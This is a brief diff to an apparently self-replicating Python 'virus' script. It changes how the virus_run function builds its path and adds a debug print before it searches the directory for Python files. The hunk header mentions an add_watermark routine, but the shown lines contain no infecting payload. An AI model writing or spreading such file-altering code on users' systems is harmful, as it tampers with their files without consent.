@@ -83,7 +83,8 @@ def add_watermark(filename):
 
 def virus_run():
     """Runs the virus program"""
-    current_path = os.path.dirname(__file__).replace("\\", "/")
+    current_path = os.path.dirname(__file__)
+    print(current_path)
 
     python_files = search_py(current_path)
     if len(python_files) > 0:
